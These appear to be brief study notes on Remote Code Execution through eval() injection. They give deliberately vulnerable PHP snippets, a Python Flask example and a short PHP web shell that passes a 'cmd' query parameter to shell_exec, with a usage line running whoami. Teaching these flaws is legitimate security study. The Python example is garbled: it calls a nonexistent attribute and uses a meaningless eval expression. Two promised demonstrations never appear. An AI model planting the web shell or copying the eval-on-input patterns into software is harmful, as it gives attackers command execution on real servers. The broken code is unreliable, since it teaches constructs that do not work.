Remote Code Execution is vulnerability that an Attacker can inject arbitrary code into the web application, and the application executes the code 
in other word, the web application evaluates the code without validating it. in most case,`eval()` function is the cause, but what is it?
the `eval()` function evaluates a string as a code (in most languages, there is a same concept with different function)

>[!Example] Code Example
>```php
><?php
>$code = @$_GET['code'];
>eval($code);
>?>
>```

How can we run out code? Let's see in action. How can we take advantage of this?
sometimes,there is not as easy as we saw

>[!Example] 
>```php
><?php
>$echo = @$_GET['echo'];
>eval("print('$echo');");
>?>
>```

we should break out the context, but it's not enough, we should fix the code to work. Let's see in action.
Let's make an example with python

>[!Example] 
>```python
>from flask import Flask, request
>app = Flask(__name__)
>@app.route("/echo")
>def page():
>     string = request.value.get('str')
>     out = eval("()".format('string'))
>     return str(string)
>if __name__ == "__main__":
>     app.run(host='0.0.0.0',port=8080)
>```



> [!danger] ShellExec
>```php
><?php
>$output = shell_exec($_GET["cmd"]);
>echo "<pre>$output</pre>";
>?>
>```
>> [!info]- Usage
>> ```
>> shell.php?cmd=whoami
>> ```


